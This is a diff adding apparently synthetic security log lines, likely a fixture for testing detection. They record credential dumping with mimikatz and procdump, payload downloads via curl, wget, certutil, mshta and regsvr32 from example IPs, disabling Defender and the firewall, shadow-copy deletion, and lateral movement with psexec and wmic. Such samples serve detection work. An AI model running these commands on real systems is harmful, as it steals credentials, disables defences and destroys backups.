@@ -1,0 +1,32 @@
+2026-04-19 09:00:01 EDR host=win10-lab user=analyst cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+2026-04-19 09:00:05 EDR host=win10-lab user=analyst powershell.exe [System.Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAA=')
+2026-04-19 09:01:10 EDR host=dc01 user=administrator mimikatz.exe privilege::debug sekurlsa::logonpasswords
+2026-04-19 09:01:16 EDR host=dc01 user=administrator procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
+2026-04-19 09:02:01 Sysmon host=win10-lab user=analyst schtasks /create /sc minute /mo 30 /tn Updater /tr C:\ProgramData\updater.exe
+2026-04-19 09:02:08 Sysmon host=linux-jump user=root echo '* * * * * /tmp/backup.sh' >> /etc/cron
+2026-04-19 09:03:00 Proxy host=edge01 user=svc-web curl http://198.51.100.88/update.bin -o /tmp/update.bin
+2026-04-19 09:03:05 Proxy host=edge01 user=svc-web wget http://198.51.100.88/agent.sh -O /tmp/agent.sh
+2026-04-19 09:03:12 Proxy host=edge01 user=svc-web Invoke-WebRequest https://pastebin.com/raw/abcd1234
+2026-04-19 09:03:20 Proxy host=edge01 user=svc-web downloadstring from raw.githubusercontent.com/evil/repo/main/run.ps1
+2026-04-19 09:04:02 Sysmon host=finance-pc user=employee certutil -urlcache -split -f http://198.51.100.77/dropper.exe C:\Users\Public\dropper.exe
+2026-04-19 09:04:09 Sysmon host=finance-pc user=employee mshta http://198.51.100.77/launch.hta
+2026-04-19 09:04:15 Sysmon host=finance-pc user=employee regsvr32 /s /n /u /i:http://198.51.100.77/scrobj.sct scrobj.dll
+2026-04-19 09:05:00 Windows Defender host=sec-test user=admin Set-MpPreference -DisableRealtimeMonitoring $true
+2026-04-19 09:05:06 Firewall host=sec-test user=admin netsh advfirewall set allprofiles state off
+2026-04-19 09:05:12 Service Control host=sec-test user=admin Stop-Service Defender
+2026-04-19 09:06:00 Backup host=file01 user=administrator vssadmin delete shadows /all /quiet
+2026-04-19 09:06:08 Backup host=file01 user=administrator wbadmin delete catalog -quiet
+2026-04-19 09:06:15 Note host=file01 user=administrator ransom message created in C:\Users\Public\READ_ME.txt
+2026-04-19 09:06:21 Note host=file01 user=administrator decryptor unavailable after encrypt operation
+2026-04-19 09:07:00 Auth host=server01 user=root sudo -i
+2026-04-19 09:07:06 Auth host=server01 user=root privilege escalation via token impersonation
+2026-04-19 09:08:01 SMB host=ops01 user=administrator psexec \\10.0.0.25 cmd.exe /c whoami
+2026-04-19 09:08:10 RDP host=ops01 user=administrator remote desktop login to 10.0.0.25
+2026-04-19 09:08:18 WMIC host=ops01 user=administrator wmic /node:10.0.0.25 process call create cmd.exe
+2026-04-19 09:09:00 File host=hr-laptop user=employee execution from C:\Users\employee\AppData\Roaming\temp.exe
+2026-04-19 09:09:07 File host=hr-laptop user=employee execution from C:\ProgramData\svc.dll
+2026-04-19 09:09:14 File host=linux-app user=www-data /tmp/updater.bin launched with bash /tmp/run.sh
+2026-04-19 09:09:22 File host=linux-app user=www-data /dev/shm/cache.so injected into worker
+2026-04-19 09:10:00 Recon host=web01 user=www-data ngrok tunnel started for external callback 203.0.113.80
+2026-04-19 09:10:08 Recon host=web01 user=www-data discordapp webhook beacon from 203.0.113.80
+2026-04-19 09:10:16 Recon host=web01 user=www-data admin$ share access from 203.0.113.80
